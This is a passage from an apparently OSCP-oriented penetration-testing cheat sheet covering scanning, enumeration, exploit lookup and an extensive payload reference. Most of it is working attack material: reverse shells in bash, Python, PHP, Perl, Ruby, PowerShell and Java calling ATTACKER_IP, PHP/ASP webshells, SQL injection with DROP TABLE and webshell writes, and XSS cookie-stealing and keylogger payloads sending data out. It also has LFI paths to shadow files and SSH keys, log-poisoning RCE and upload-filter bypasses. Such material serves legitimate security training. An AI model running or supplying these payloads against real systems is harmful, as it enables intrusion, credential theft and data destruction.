nmap --script=http-form-brute --script-args 'http-form-brute.path=/login,http-form-brute.uservar=user,http-form-brute.passvar=pass' TARGET_IP
```

---

### Unusual Ports Reference Table

| Port | Protocol | Service | Attack Vector |
|---|---|---|---|
| 21 | TCP | FTP | Anonymous login, brute force, vsftpd backdoor |
| 22 | TCP | SSH | Brute force, old version CVE |
| 23 | TCP | Telnet | Cleartext creds, brute force |
| 25 | TCP | SMTP | Open relay, user enumeration |
| 53 | TCP/UDP | DNS | Zone transfer, cache poisoning |
| 69 | UDP | TFTP | Anonymous read/write |
| 80/443 | TCP | HTTP/S | All web attacks |
| 110 | TCP | POP3 | Brute force, cleartext |
| 111 | TCP | RPC/portmap | NFS mount, RPC enum |
| 135 | TCP | MS-RPC | MS exploits, DCOM |
| 139/445 | TCP | SMB | EternalBlue, null session, relay |
| 161 | UDP | SNMP | Community string = full info dump |
| 389/636 | TCP | LDAP | User enumeration, pass spray |
| 512-514 | TCP | rexec/rsh/rlogin | No auth required! |
| 623 | UDP | IPMI | Default creds, hash dump |
| 873 | TCP | rsync | Unauth file access |
| 1433 | TCP | MSSQL | SA empty pass, xp_cmdshell |
| 1521 | TCP | Oracle | Default creds, tnspoison |
| 2049 | TCP | NFS | Mount without auth |
| 2375 | TCP | Docker | Unauth container control |
| 3000 | TCP | Grafana/Node | Default creds |
| 3306 | TCP | MySQL | Empty root password |
| 3389 | TCP | RDP | Brute force, BlueKeep |
| 4444 | TCP | Metasploit | Active listener! |
| 5432 | TCP | PostgreSQL | Default creds, COPY cmd |
| 5900 | TCP | VNC | Default/no password |
| 5985/5986 | TCP | WinRM | evil-winrm, remote PS |
| 6379 | TCP | Redis | Unauthenticated RCE |
| 8080/8443 | TCP | Alt HTTP | Tomcat, Jenkins, dev apps |
| 8888 | TCP | Jupyter | RCE via notebooks |
| 9200/9300 | TCP | Elasticsearch | Unauth data access |
| 11211 | TCP | Memcached | Unauth access |
| 27017 | TCP | MongoDB | No auth default |

---

## 🌐 STEP 9: WEB SCANNING

### Nikto — Complete Usage

```bash
# ─── BASIC SCANS ───
nikto -h http://TARGET_IP
nikto -h https://TARGET_IP
nikto -h http://TARGET_IP -p 8080
nikto -h http://TARGET_IP -p 8443
nikto -h http://TARGET_IP:8080

# ─── OUTPUT ───
nikto -h http://TARGET_IP -o nikto.txt
nikto -h http://TARGET_IP -o nikto.html -Format html
nikto -h http://TARGET_IP -o nikto.xml -Format xml
nikto -h http://TARGET_IP -o nikto.csv -Format csv

# ─── AUTHENTICATION ───
nikto -h http://TARGET_IP -id admin:password
nikto -h http://TARGET_IP -id admin:password -auth Basic

# ─── TUNING (scan categories) ───
nikto -h http://TARGET_IP -Tuning 1    # Interesting files
nikto -h http://TARGET_IP -Tuning 2    # Misconfiguration
nikto -h http://TARGET_IP -Tuning 3    # Information disclosure
nikto -h http://TARGET_IP -Tuning 4    # Injection (XSS/SQLi)
nikto -h http://TARGET_IP -Tuning 6    # Denial of Service
nikto -h http://TARGET_IP -Tuning 7    # Remote file retrieval
nikto -h http://TARGET_IP -Tuning 9    # SQL injection
nikto -h http://TARGET_IP -Tuning x    # Reverse Tuning (all but x)
nikto -h http://TARGET_IP -Tuning 1234 # Multiple categories

# ─── EVASION ───
nikto -h http://TARGET_IP -evasion 1   # Random URI encoding
nikto -h http://TARGET_IP -evasion 2   # Directory self-reference (/.//)
nikto -h http://TARGET_IP -evasion 3   # Premature URL ending
nikto -h http://TARGET_IP -evasion 4   # Long random string

# ─── THROUGH PROXY (Burp) ───
nikto -h http://TARGET_IP -useproxy http://127.0.0.1:8080

# ─── VIRTUAL HOST ───
nikto -h TARGET_IP -vhost admin.target.com

# ─── PLUGINS ───
nikto -h http://TARGET_IP -Plugins headers
nikto -h http://TARGET_IP -Plugins shellshock
nikto -h http://TARGET_IP -Plugins cookies
```

**Nikto Output — Action Table:**

| Finding | Meaning | Next Step |
|---|---|---|
| `Apache/2.4.49` | Version in header | searchsploit apache 2.4.49 |
| `PUT method allowed` | Can upload files | Upload PHP webshell |
| `DELETE method allowed` | Can delete files | Note, test carefully |
| `/admin/ requires auth` | Admin panel exists | Default creds attack |
| `/backup.zip found` | Backup exposed | wget it, analyze |
| `phpMyAdmin detected` | DB admin panel | Default creds + SQLi |
| `X-Frame-Options missing` | Clickjacking | Note for report |
| `Cookie without HttpOnly` | Session theft possible | Note for report |
| `Directory indexing on /` | Files listed publicly | Browse + download all |
| `Shellshock possible` | CVE-2014-6271 RCE | Exploit immediately |
| `Default file found: /test.php` | Dev leftover | Check for info |

---

### Gobuster / Dirb / Feroxbuster

```bash
# ─── GOBUSTER DIR ───
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://TARGET_IP -w wordlist.txt -x php,html,txt,bak,zip
gobuster dir -u http://TARGET_IP -w wordlist.txt -o gobuster_results.txt
gobuster dir -u http://TARGET_IP -w wordlist.txt -t 50             # 50 threads
gobuster dir -u http://TARGET_IP -w wordlist.txt -b 403,404        # blacklist codes
gobuster dir -u http://TARGET_IP -w wordlist.txt -U admin -P pass  # with auth
gobuster dir -u http://TARGET_IP -w wordlist.txt -k                # skip TLS verify
gobuster dir -u http://TARGET_IP -w wordlist.txt --proxy http://127.0.0.1:8080

# ─── DIRB ───
dirb http://TARGET_IP
dirb http://TARGET_IP /usr/share/wordlists/dirb/big.txt
dirb http://TARGET_IP -o dirb_results.txt
dirb http://TARGET_IP -X .php,.html,.txt               # extensions
dirb http://TARGET_IP -a "Mozilla/5.0"                 # custom UA
dirb http://TARGET_IP -u admin:password                # basic auth
dirb http://TARGET_IP -p http://127.0.0.1:8080         # through proxy

# ─── FEROXBUSTER (recursive) ───
feroxbuster -u http://TARGET_IP
feroxbuster -u http://TARGET_IP -w wordlist.txt
feroxbuster -u http://TARGET_IP -w wordlist.txt -x php,html
feroxbuster -u http://TARGET_IP --depth 3              # recurse 3 levels
feroxbuster -u http://TARGET_IP -t 100                 # 100 threads
feroxbuster -u http://TARGET_IP -o ferox_results.txt
feroxbuster -u http://TARGET_IP --filter-status 404,403

# ─── WORDLISTS (best to worst) ───
/usr/share/wordlists/dirb/common.txt                   # Quick start
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   # OSCP standard
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/wordlists/dirb/big.txt
```

---

### WPScan — WordPress Scanner

```bash
# ─── BASIC SCAN ───
wpscan --url http://target.com
wpscan --url http://target.com --disable-tls-checks

# ─── ENUMERATE ───
wpscan --url http://target.com --enumerate u          # users
wpscan --url http://target.com --enumerate p          # plugins
wpscan --url http://target.com --enumerate t          # themes
wpscan --url http://target.com --enumerate vp         # vulnerable plugins
wpscan --url http://target.com --enumerate vt         # vulnerable themes
wpscan --url http://target.com --enumerate ap         # all plugins
wpscan --url http://target.com --enumerate u,p,t      # all at once

# ─── PASSWORD ATTACK ───
wpscan --url http://target.com -P rockyou.txt -U admin
wpscan --url http://target.com -P rockyou.txt -U users.txt
wpscan --url http://target.com --password-attack xmlrpc   # via XML-RPC

# ─── WITH API TOKEN (more vuln data) ───
wpscan --url http://target.com --api-token YOUR_TOKEN

# ─── OUTPUT ───
wpscan --url http://target.com -o wpscan_results.txt
wpscan --url http://target.com -f json -o wpscan.json
```

---

## ⚙️ STEP 10: SERVICE-SPECIFIC ENUMERATION

### SMB Enumeration

```bash
# ─── ENUM4LINUX ───
enum4linux TARGET_IP                          # full auto
enum4linux -a TARGET_IP                       # all checks
enum4linux -U TARGET_IP                       # users only
enum4linux -S TARGET_IP                       # shares only
enum4linux -P TARGET_IP                       # password policy
enum4linux -G TARGET_IP                       # groups
enum4linux -u admin -p password TARGET_IP     # with creds

# ─── SMBCLIENT ───
smbclient -L //TARGET_IP                      # list shares
smbclient -L //TARGET_IP -N                   # null session
smbclient -L //TARGET_IP -U admin             # with user
smbclient //TARGET_IP/share -N               # connect to share
smbclient //TARGET_IP/C$ -U admin            # admin share
# Inside smbclient:
# ls         → list files
# get file   → download
# put file   → upload
# mget *     → download all

# ─── SMBMAP ───
smbmap -H TARGET_IP                           # list shares + perms
smbmap -H TARGET_IP -u null                   # null session
smbmap -H TARGET_IP -u admin -p password
smbmap -H TARGET_IP -r sharename             # list files in share
smbmap -H TARGET_IP -R sharename             # recursive list
smbmap -H TARGET_IP --download 'C$\file.txt'

# ─── CrackMapExec ───
crackmapexec smb TARGET_IP
crackmapexec smb TARGET_IP -u admin -p password
crackmapexec smb TARGET_IP -u '' -p ''        # null session
crackmapexec smb TARGET_IP --shares
crackmapexec smb TARGET_IP --users
crackmapexec smb TARGET_IP --pass-pol
crackmapexec smb 192.168.1.0/24              # entire subnet
```

### SNMP Enumeration

```bash
# ─── SNMPWALK ───
snmpwalk -c public -v1 TARGET_IP              # version 1
snmpwalk -c public -v2c TARGET_IP             # version 2c
snmpwalk -c public -v2c TARGET_IP 1.3.6.1.2.1.1   # system info
snmpwalk -c public -v2c TARGET_IP 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -c public -v2c TARGET_IP 1.3.6.1.2.1.25.4.2.1.2 # running processes
snmpwalk -c public -v2c TARGET_IP 1.3.6.1.2.1.25.6.3.1.2 # installed software
snmpwalk -c public -v2c TARGET_IP 1.3.6.1.2.1.6.13.1.3   # open TCP ports

# ─── SNMPGET ───
snmpget -c public -v2c TARGET_IP sysDescr.0
snmpget -c public -v2c TARGET_IP sysName.0

# ─── ONESIXTYONE — Community String Brute ───
onesixtyone TARGET_IP public
onesixtyone TARGET_IP private
onesixtyone TARGET_IP -c /usr/share/wordlists/metasploit/snmp_default_pass.txt
onesixtyone -c community_strings.txt TARGET_IP

# ─── COMMUNITY STRINGS TO TRY ───
# public (most common)
# private
# community
# manager
# cisco
# CISCO
# admin
# password
# secret

# ─── SNMPENUM ───
snmp-check TARGET_IP                          # full auto
snmp-check TARGET_IP -c public
```

### NFS Enumeration

```bash
# Show NFS shares
showmount -e TARGET_IP
showmount -a TARGET_IP                        # all mount points

# Mount NFS share
sudo mount -t nfs TARGET_IP:/share /mnt/nfs
sudo mount -t nfs TARGET_IP:/share /mnt/nfs -o nolock

# Check after mount
ls -la /mnt/nfs
cat /mnt/nfs/important_file.txt

# Unmount
sudo umount /mnt/nfs
```

### LDAP Enumeration

```bash
# ─── LDAPSEARCH ───
ldapsearch -h TARGET_IP -x                    # anonymous bind
ldapsearch -h TARGET_IP -x -b "dc=target,dc=com"
ldapsearch -h TARGET_IP -x -b "dc=target,dc=com" "(objectClass=*)"
ldapsearch -h TARGET_IP -x -b "dc=target,dc=com" "(objectClass=user)"
ldapsearch -h TARGET_IP -D "cn=admin,dc=target,dc=com" -w password -b "dc=target,dc=com"

# Find users
ldapsearch -h TARGET_IP -x -b "dc=target,dc=com" "(objectClass=person)"

# Find groups
ldapsearch -h TARGET_IP -x -b "dc=target,dc=com" "(objectClass=group)"
```

### SMTP Enumeration

```bash
# ─── MANUAL ───
nc TARGET_IP 25
telnet TARGET_IP 25
# Try:
VRFY root
VRFY admin
EXPN postmaster

# ─── SMTP-USER-ENUM ───
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP
smtp-user-enum -M EXPN -U users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U users.txt -t TARGET_IP -D target.com
```

---

## 🛡️ STEP 11: VULNERABILITY SCANNING

### Nessus Setup & Usage

```bash
# ─── INSTALLATION ───
wget https://www.tenable.com/downloads/nessus   # get .deb
sudo dpkg -i Nessus-10.x.x-debian10_amd64.deb
sudo systemctl start nessusd
sudo systemctl enable nessusd
# Browser: https://localhost:8834
# Register free "Nessus Essentials" (16 IP limit)
```

**Scan Workflow:**
```
1. Click New Scan → Basic Network Scan
2. Name: "OSCP - [TARGET_IP]"
3. Targets: 192.168.x.x
4. Schedule: (leave as manual)
5. Credentials tab:
   └── Add SSH/SMB creds if available (authenticated scan)
6. Save → Launch (▶)
7. Wait 15-30 minutes
8. View Results
```

**Results Priority:**

```
╔══════════════════════════════════════════════════════════╗
║                   NESSUS SEVERITY                        ║
╠══════════╦════════╦═════════════════════════════════════╣
║ CRITICAL ║ Red    ║ Exploit immediately — don't skip     ║
║ HIGH     ║ Orange ║ Priority 2 — try after critical      ║
║ MEDIUM   ║ Yellow ║ Useful post-exploitation             ║
║ LOW      ║ Green  ║ Note for final report                ║
║ INFO     ║ Blue   ║ Misconfiguration/info only           ║
╚══════════╩════════╩═════════════════════════════════════╝
```

**CVSS Score Guide:**

| CVSS Score | Rating | Action |
|---|---|---|
| 9.0 – 10.0 | Critical | Exploit immediately |
| 7.0 – 8.9 | High | Exploit second |
| 4.0 – 6.9 | Medium | After high severity |
| 0.1 – 3.9 | Low | Note only |

**Authenticated vs Unauthenticated:**

| | Unauthenticated | Authenticated |
|---|---|---|
| Viewpoint | External attacker | Inside the system |
| Findings count | Less (surface) | More (deep) |
| OSCP use | Primary scan | If you capture creds |
| Requirements | None | Username + password |

---

### OpenVAS / GVM Setup & Usage

```bash
# ─── INSTALLATION ───
sudo apt update && sudo apt install openvas -y
sudo gvm-setup                 # First time — takes 10-30 min!
sudo gvm-start
sudo gvm-check-setup           # verify everything OK

# ─── ACCESS ───
# Browser: https://127.0.0.1:9392
# Username: admin
# Password: shown during gvm-setup (save it!)

# ─── CLI USAGE ───
gvm-cli socket --gmp-username admin --gmp-password PASS --xml "<get_version/>"
```

**OpenVAS Scan Workflow:**
```
1. Login → Configuration → Targets → ☆ New Target
   ├── Name: OSCP Target
   ├── Hosts: 192.168.x.x
   └── Save

2. Scans → Tasks → ☆ New Task
   ├── Name: OSCP Full Scan
   ├── Scan Targets: [target from step 1]
   ├── Scanner: OpenVAS Default
   ├── Scan Config: Full and Fast
   └── Save → ▶ Start

3. Wait (30-60 min for full scan)

4. Results → Click task → View all findings
   └── Note all CVE IDs → match with searchsploit

5. Export: Reports → Download as PDF/XML
```

---

## 🗺️ STEP 12: CVE → EXPLOIT MAPPING

### Searchsploit Complete Usage

```bash
# ─── SEARCH ───
searchsploit apache 2.4.49
searchsploit openssh 7.2
searchsploit windows 7 smb
searchsploit wordpress 5.6
searchsploit tomcat 9.0
searchsploit "remote code execution"
searchsploit --cve 2021-41773            # by CVE number
searchsploit CVE-2021-41773

# ─── COPY EXPLOIT ───
searchsploit -m exploits/linux/webapps/50383.py    # full path
searchsploit -m 50383                               # just the ID

# ─── READ EXPLOIT ───
searchsploit -x exploits/linux/webapps/50383.py    # open in less

# ─── UPDATE DB ───
searchsploit -u

# ─── OUTPUT FORMAT ───
searchsploit apache --json                          # JSON output
searchsploit apache -w                              # show URL too

# ─── EXACT MATCH ───
searchsploit -e "Apache 2.4.49"                    # exact string
```

### CVE → Exploit Decision Tree

```
Scanner found: CVE-2021-41773
           │
           ▼
searchsploit CVE-2021-41773
searchsploit apache 2.4.49
           │
      ┌────┴────┐
      ▼         ▼
   Found      Not found
      │         │
      ▼         ▼
Copy it        GitHub:
searchsploit   site:github.com "CVE-2021-41773"
-m path/exp    site:github.com "CVE-2021-41773 PoC"
      │            │
      └─────┬──────┘
            ▼
  READ THE EXPLOIT CODE FIRST
  Check:
  ├── Target version match?
  ├── OS/platform match?
  ├── Prerequisites?
  └── How does it work?
            │
            ▼
  MANUAL VERIFY BEFORE RUNNING
  curl -v http://target/test
  nc -v target port
            │
            ▼
  RUN EXPLOIT WITH CORRECT ARGS
            │
       ┌────┴────┐
       ▼         ▼
    Shell!     Failed
               │
               ▼
       Debug: check syntax,
       version, try other exploit
```

### Common CVEs — OSCP Cheat Sheet

| CVE / Name | Service | Type | Searchsploit Query |
|---|---|---|---|
| CVE-2021-41773 | Apache 2.4.49 | Path Traversal + RCE | `apache 2.4.49` |
| CVE-2021-42013 | Apache 2.4.50 | RCE | `apache 2.4.50` |
| MS17-010 / EternalBlue | SMB Win7/2008 | RCE | `ms17-010` |
| CVE-2019-0708 / BlueKeep | RDP | RCE | `bluekeep` |
| CVE-2014-6271 / Shellshock | Bash/CGI | RCE | `shellshock` |
| CVE-2017-5638 | Struts2 | RCE | `struts2` |
| CVE-2019-11043 | PHP-FPM + nginx | RCE | `php-fpm` |
| CVE-2018-7600 / Drupalgeddon2 | Drupal | RCE | `drupal 8` |
| CVE-2014-0160 / Heartbleed | OpenSSL | Info Disclosure | `heartbleed` |
| vsftpd 2.3.4 backdoor | FTP | RCE (port 6200) | `vsftpd 2.3.4` |
| ProFTPD mod_copy | FTP | RCE | `proftpd` |
| CVE-2010-4478 | OpenSSH 5.6 | Auth bypass | `openssh 5.6` |
| Jenkins Groovy Script | Jenkins 8080 | RCE | `jenkins` |
| CVE-2021-3156 / Baron Samedit | Sudo < 1.9.5p2 | Privesc | `sudo` |
| CVE-2019-14287 | Sudo | Privesc | `sudo 1.8` |
| DirtyCow CVE-2016-5195 | Linux kernel | Privesc | `dirty cow` |

---

## 💣 STEP 13: ALL PAYLOADS REFERENCE

### Reverse Shell Payloads

```bash
# ═══ START LISTENER FIRST ═══
nc -nlvp 4444
rlwrap nc -nlvp 4444          # with readline (history, arrow keys)
nc -nlvp 443                   # use 443/80 to bypass firewall

# ═══ BASH ═══
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196

# URL encoded bash (for web params):
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27

# ═══ PYTHON ═══
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

# ═══ NETCAT ═══
nc -e /bin/sh ATTACKER_IP 4444
nc -e /bin/bash ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# ═══ PHP ═══
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP webshell (upload to server):
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

# Full PHP reverse shell file:
# /usr/share/webshells/php/php-reverse-shell.php
# Edit $ip = 'ATTACKER_IP'; and $port = 4444;

# ═══ PERL ═══
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));STDIN->fdopen(S,r);$~->fdopen(S,w);system $_ while<>;'

# ═══ RUBY ═══
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# ═══ POWERSHELL (Windows) ═══
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded PowerShell (bypass restrictions):
# Generate: echo "POWERSHELL_CMD" | iconv -t UTF-16LE | base64 -w0
powershell -enc BASE64_ENCODED_COMMAND

# ═══ JAVA ═══
Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5|while read line;do $line 2>&5>&5;done"});
p.waitFor();

# ═══ LUA ═══
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# ═══ UPGRADE TO FULL TTY ═══
# On victim — Step 1:
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Step 2: Ctrl+Z to background nc, then:
stty raw -echo; fg

# Step 3: On victim:
export TERM=xterm
stty rows 38 columns 116

# ═══ WEBSHELLS ON DISK ═══
ls /usr/share/webshells/
/usr/share/webshells/php/          # PHP shells
/usr/share/webshells/asp/          # ASP shells
/usr/share/webshells/aspx/         # ASPX shells
/usr/share/webshells/cfm/          # ColdFusion
/usr/share/webshells/jsp/          # Java/JSP
/usr/share/webshells/perl/         # Perl
```

---

### SQL Injection Payloads

```sql
-- ═══ DETECTION PAYLOADS ═══
'
''
`
')
'))
1'
1"
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1'--

-- ═══ UNION-BASED ═══
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--          (find number of columns)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,@@hostname,3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,concat(username,':',password),3 FROM users--

-- ═══ ERROR-BASED ═══
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,database()),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- ═══ BLIND BOOLEAN ═══
' AND 1=1--    (true  → same response)
' AND 1=2--    (false → different response = blind SQLi!)
' AND substring(database(),1,1)='a'--
' AND length(database())=8--

-- ═══ TIME-BASED BLIND ═══
' AND SLEEP(5)--                           (MySQL)
' AND (SELECT SLEEP(5))--
'; WAITFOR DELAY '0:0:5'--                 (MSSQL)
'; SELECT pg_sleep(5)--                    (PostgreSQL)
' OR 1=1; exec master..xp_cmdshell 'ping 127.0.0.1'-- (MSSQL)

-- ═══ STACKED QUERIES ═══
'; INSERT INTO users VALUES ('hacker','hacked123')--
'; DROP TABLE users--

-- ═══ FILE READ (MySQL) ═══
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--

-- ═══ FILE WRITE → WEBSHELL ═══
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--

-- ═══ MSSQL — xp_cmdshell ═══
'; exec master..xp_cmdshell 'whoami'--
'; exec master..xp_cmdshell 'powershell -c "..."'--

-- ═══ SQLMAP ═══
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --forms --dbs
sqlmap -r request.txt --dbs            # from Burp saved request
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

---

### XSS Payloads

```html
<!-- ═══ BASIC DETECTION ═══ -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- ═══ FILTER BYPASS ═══ -->
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>

<!-- Case variation bypass -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Encoded bypass -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
\x3cscript\x3ealert(1)\x3c/script\x3e

<!-- ═══ COOKIE STEALING ═══ -->
<script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER_IP/steal?c='+document.cookie)">
<script>new Image().src='http://ATTACKER_IP/steal?c='+document.cookie</script>

<!-- ═══ KEYLOGGER ═══ -->
<script>document.onkeypress=function(e){fetch('http://ATTACKER_IP/key?k='+e.key)}</script>
```

---

### File Inclusion Payloads (LFI/RFI)

```bash
# ═══ LFI DETECTION ═══
?page=../../../etc/passwd
?file=../../../../etc/passwd
?include=../../../../../etc/passwd
?doc=../../../../../../etc/passwd

# ═══ LFI — LINUX FILES TO READ ═══
/etc/passwd                         # Users list
/etc/shadow                         # Password hashes (root needed)
/etc/hosts                          # Hostname/IP mapping
/etc/hostname                       # Machine name
/etc/crontab                        # Cron jobs
/etc/ssh/sshd_config               # SSH config
/home/user/.ssh/id_rsa             # User SSH private key
/root/.ssh/id_rsa                  # Root SSH key
/var/log/apache2/access.log        # Apache logs
/var/log/apache2/error.log         # Apache error logs
/proc/version                      # Kernel version
/proc/self/environ                  # Environment variables
/var/www/html/config.php           # Web app config
/var/www/html/wp-config.php        # WordPress config

# ═══ LFI — WINDOWS FILES ═══
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\sam               # SAM database
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Program Files\Apache\conf\httpd.conf

# ═══ LFI BYPASS TECHNIQUES ═══
../etc/passwd%00               # Null byte (old PHP)
..%2fetc%2fpasswd              # URL encoded /
..%252fetc%252fpasswd          # Double URL encoded
....//etc/passwd               # Double dot
..././etc/passwd               # Mixed encoding
/etc/passwd                    # Absolute path
php://filter/convert.base64-encode/resource=/etc/passwd   # PHP filter
php://input                    # PHP input stream
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+    # Data wrapper

# ═══ LFI → RCE (Log Poisoning) ═══
# Step 1: Inject PHP into Apache access log via User-Agent:
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Step 2: Include the log file:
?file=../../../var/log/apache2/access.log&cmd=id

# Step 3: If works, get reverse shell:
?file=../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# ═══ RFI PAYLOADS ═══
?page=http://ATTACKER_IP/shell.php
?file=http://ATTACKER_IP/shell.php?
?include=\\ATTACKER_IP\share\shell.php    # Windows UNC
?page=ftp://ATTACKER_IP/shell.php

# Host your shell:
python3 -m http.server 80
```

---

### Command Injection Payloads

```bash
# ═══ DETECTION ═══
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
; id
; uname -a
; cat /etc/passwd

# ═══ BYPASS FILTERS ═══
;w`h`oami
;w$()oami
;who$@ami
; /usr/bin/id
; /usr/bin/whoami

# URL encoded
%3B%20whoami        # ; whoami
%7C%20whoami        # | whoami
%26%26%20whoami     # && whoami

# ═══ WINDOWS CMD INJECTION ═══
; dir
& dir
| dir
&& dir
|| dir
; whoami /all
& net user
& net localgroup administrators

# ═══ GET REVERSE SHELL VIA CMD INJECTION ═══
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; nc ATTACKER_IP 4444 -e /bin/bash
; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

---

### File Upload Bypass Payloads

```bash
# ═══ EXTENSION BYPASS ═══
shell.php
shell.php5
shell.php4
shell.php3
shell.phtml
shell.pHTM
shell.PhP
shell.PHP5
shell.php.jpg
shell.php%00.jpg         # null byte
shell.php.              # trailing dot
shell.php/
shell.asp
shell.aspx
shell.ashx
shell.cer
shell.jsp
shell.jspx
shell.shtml

# ═══ CONTENT-TYPE SPOOF ═══
# Change header in Burp:
# Content-Type: application/x-php
# → Change to:
# Content-Type: image/jpeg

# ═══ MAGIC BYTES BYPASS ═══
# Add to beginning of PHP file:
GIF89a;<?php system($_GET['cmd']); ?>
PNG<?php system($_GET['cmd']); ?>

# ═══ WEBSHELL PAYLOADS ═══
# PHP minimal:
<?php system($_GET['cmd']); ?>

# PHP extended:
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# ASP:
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.Form("cmd")).StdOut.ReadAll()) %>

# ASPX:
<%@ Page Language="C#" %>
<% System.Diagnostics.Process p=new System.Diagnostics.Process();
p.StartInfo.FileName="cmd.exe";
p.StartInfo.Arguments="/c "+Request.Form["cmd"];
p.StartInfo.UseShellExecute=false;
